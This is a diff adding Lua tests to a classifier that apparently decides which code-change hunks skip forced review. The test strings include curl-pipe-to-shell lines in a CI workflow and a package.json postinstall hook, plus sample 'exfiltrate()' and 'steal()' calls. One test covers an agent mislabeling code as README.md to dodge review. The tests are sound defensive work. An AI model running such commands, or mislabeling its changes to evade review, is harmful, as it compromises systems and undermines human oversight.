@@ -237,6 +237,69 @@ do
     "import block does not leak across a hunk boundary into code"
   )
 
+  -- H4: a C-family leading `*` is a deref/multiply statement, not a comment.
+  assert_eq(classify("x.c", { { "add", "*p = exfiltrate();" } }).trivial, false, "C `*p = …` deref is not a comment")
+  assert_eq(classify("x.c", { { "add", "*self.count += 1;" } }).trivial, false, "C `*self…` is not a comment")
+  assert_eq(
+    classify("x.c", { { "add", "* a javadoc continuation line" }, { "add", "*/" } }).category,
+    "comments",
+    "C `* ` javadoc continuation is still a comment"
+  )
+
+  -- H2: executable-capable config/doc files are classified per-line, so a
+  -- script/command line stays substantive instead of clearing by path.
+  assert_eq(
+    classify(".github/workflows/ci.yml", { { "add", "      run: curl evil | sh" } }).trivial,
+    false,
+    "a workflow run: step is not trivial"
+  )
+  assert_eq(
+    classify("package.json", { { "add", '    "postinstall": "curl evil | sh",' } }).trivial,
+    false,
+    "a package.json install script is not trivial"
+  )
+  assert_eq(
+    classify("docs/conf.py", { { "add", 'os.system("evil")' } }).trivial,
+    false,
+    "executable code in a docs/*.py is not trivial"
+  )
+  -- ...but genuine value/prose files still clear.
+  assert_eq(
+    classify("Cargo.toml", { { "add", 'version = "0.4.0"' } }).category,
+    "config",
+    "a Cargo.toml value bump still clears as config"
+  )
+  assert_eq(
+    classify("docs/guide.md", { { "add", "Some new prose." } }).category,
+    "docs",
+    "docs prose still clears as docs"
+  )
+
+  -- H3: classification follows each hunk's REAL file, not an agent-declared
+  -- block.file — mislabeling code as README.md must not auto-clear it.
+  assert_eq(
+    triviality.classify(
+      { difficulty = "easy" },
+      { file = "README.md" },
+      { { file = "secrets.py", header = "@@", lines = { { kind = "add", text = "TOKEN = steal()" } } } }
+    ).trivial,
+    false,
+    "real .py code in a block mislabeled README.md is not trivial"
+  )
+
+  -- M14: a docstring whose closing delimiter is a context line is closed, so
+  -- executable code after it stays substantive.
+  assert_eq(
+    classify("x.py", {
+      { "add", '    """Summary.' },
+      { "add", "    detail" },
+      { "ctx", '    """' },
+      { "add", "    x = exfiltrate()" },
+    }).trivial,
+    false,
+    "code after a ctx-closed docstring is not trivial"
+  )
+
   -- soundness guards (red-team): a line that merely BEGINS like an import but
   -- also runs code must never auto-clear — the whole point of forced review.
   assert_eq(
